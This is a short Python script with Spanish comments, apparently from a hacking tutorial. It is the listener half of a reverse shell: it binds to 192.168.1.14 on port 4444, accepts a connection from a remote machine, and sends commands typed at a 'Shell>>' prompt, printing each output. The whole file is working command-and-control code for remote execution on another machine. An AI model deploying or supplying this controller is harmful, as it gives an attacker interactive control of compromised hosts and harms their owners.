import socket
listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) #Reestablece la conexión en caso de que se pierdan los paquetes (Reusa Address)

listener.bind(('192.168.1.14', 4444))

try:
    listener.listen(0)

    print('Esperando conexiones')
    connection, address = listener.accept() #Aceptar conexiones
    print(f'[+] Conexión establecida con {address}')

    while True:
        command = input('Shell>> ')
        connection.send(bytes(command, 'utf-8'))
        result = connection.recv(4096)
        print(result.decode('utf-8'))

except KeyboardInterrupt:
    print('\nPrograma finalizado')